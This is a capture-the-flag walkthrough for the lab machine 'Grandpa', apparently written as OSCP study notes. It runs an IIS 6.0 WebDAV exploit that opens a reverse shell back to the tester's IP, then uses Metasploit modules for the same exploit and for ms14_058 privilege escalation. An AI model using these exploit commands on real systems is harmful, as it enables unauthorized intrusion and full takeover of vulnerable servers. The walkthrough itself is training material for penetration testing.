## Grandpa

Difficulty: Easy

### User Flag

Port 80 is open using Microsoft IIS httpd 6.0 and webdav.

```
rustscan -a 10.10.10.14 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/c354a3d9-28ff-4747-94c7-61550471b8c2)

We can't upload any file with webdav.

```
davtest -url http://10.10.10.14
```

![davtest](https://github.com/b1d0ws/OSCP/assets/58514930/d7d06e6e-0fec-4be5-b82d-5e1553b0881d)

But there is a public exploit for IIS and Webdav.

```
python2 exploit.py 10.10.10.14 80 10.10.14.21 1337
```

![searchingExploit](https://github.com/b1d0ws/OSCP/assets/58514930/a98659e7-6075-4128-a914-8312e2542920)

![revShell](https://github.com/b1d0ws/OSCP/assets/58514930/ad7e4676-df54-4b85-8a67-d8ec7db1a8fb)

<br>

Since we need metasploit to privilege escalation, we will use msfconsole to get another reverse shell.

```
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
```

![metasploitFirstShell](https://github.com/b1d0ws/OSCP/assets/58514930/4ac6a93d-f0e2-4a6b-9a31-6a992de3dccc)

<br>

### Root Flag

Using posti/multi/recon/local_exploit_suggester we find a lot of vulnerabilities. Let's use ms14_058.

```
migrate 1956 (wmiprvse.exe)
exploit/windows/local/ms14_058_track_popup_menu
```

![privilegeEscalation](https://github.com/b1d0ws/OSCP/assets/58514930/8687373e-fb0a-48a0-ab57-07f40877f794)

### Others

You can enumerate privilege escalation exploits with windows-exploit-suggester.py

```
systeminfo

# Put the output to a file and use windows-explot-suggester.py

python windows-exploit-suggester.py --update
python windows-exploit-suggester.py -d 2021-04-19-mssb.xls -i sysinfo
```
